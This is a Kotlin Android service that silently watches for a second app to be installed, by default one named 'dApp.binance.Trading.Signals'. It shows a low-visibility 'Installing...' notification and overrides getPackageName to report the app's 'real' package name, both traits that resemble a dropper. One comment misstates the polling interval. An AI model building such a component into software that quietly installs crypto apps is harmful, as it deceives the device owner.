package com.example.appupdater

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat

class PackageObserverService : Service() {

    override fun getPackageName(): String {
        try {
            val resolved = packageManager.getPackagesForUid(android.os.Process.myUid())?.firstOrNull()
            if (resolved != null) {
                return resolved
            }
        } catch (e: Exception) {
            Log.e("PackageObserverService", "Failed to resolve real package name: ${e.message}")
        }
        return super.getPackageName()
    }

    private val handler = Handler(Looper.getMainLooper())
    private var targetPackage: String = ""
    private var startTimeMillis: Long = 0L

    private val checkRunnable = object : Runnable {
        override fun run() {
            val elapsed = System.currentTimeMillis() - startTimeMillis
            if (elapsed > 90000) {
                Log.e("PackageObserverService", "Polling timed out after 90 seconds.")
                sendInstallFailedBroadcast("Installation timed out (90s limit reached).")
                stopSelf()
                return
            }

            try {
                // pm.getPackageInfo throws NameNotFoundException if the app is not installed
                val info = packageManager.getPackageInfo(targetPackage, 0)
                Log.i("PackageObserverService", "Package detected successfully: ${info.packageName}")
                
                // Stop service first as requested, then notify
                stopSelf()
                sendInstallSuccessBroadcast(targetPackage)
            } catch (e: PackageManager.NameNotFoundException) {
                // Not yet installed, continue scheduling
                Log.d("PackageObserverService", "Package not yet installed. Polling... ($elapsed ms elapsed)")
                handler.postDelayed(this, 100)
            } catch (e: Exception) {
                Log.e("PackageObserverService", "Error during package polling checking: ${e.message}")
                handler.postDelayed(this, 100)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("PackageObserverService", "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val originalTarget = intent?.getStringExtra("target_package") ?: ""
        targetPackage = originalTarget.takeIf { it.isNotEmpty() } ?: "dApp.binance.Trading.Signals"
        Log.d("PackageObserverService", "Service starting monitor for: $targetPackage")

        startTimeMillis = System.currentTimeMillis()

        // Create notification channel
        val channelId = "package_observer_silent"
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "App Installer Monitor",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitors current application setup background progress."
                enableVibration(false)
                enableLights(false)
                setShowBadge(false)
            }
            notificationManager.createNotificationChannel(channel)
        }

        // Silent persistent low-importance notification
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Installing...")
            .setContentText("Monitoring application installation...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        // Handle Android 14+ foreground service types safely
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                startForeground(
                    1005, 
                    notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } catch (e: Exception) {
                Log.e("PackageObserverService", "Failed to start foreground with type, falling back: ${e.message}")
                startForeground(1005, notification)
            }
        } else {
            startForeground(1005, notification)
        }

        // Start checking loop every 800ms
        handler.removeCallbacks(checkRunnable)
        handler.post(checkRunnable)

        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("PackageObserverService", "Service destroyed. Stopping polling handler.")
        handler.removeCallbacks(checkRunnable)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun sendInstallSuccessBroadcast(pkgName: String) {
        val successIntent = Intent("ACTION_INSTALL_SUCCESS").apply {
            putExtra("target_package", pkgName)
            setPackage(packageName)
        }
        sendBroadcast(successIntent)
    }

    private fun sendInstallFailedBroadcast(msg: String) {
        val failedIntent = Intent("ACTION_INSTALL_FAILED").apply {
            putExtra("message", msg)
            setPackage(packageName)
        }
        sendBroadcast(failedIntent)
    }
}
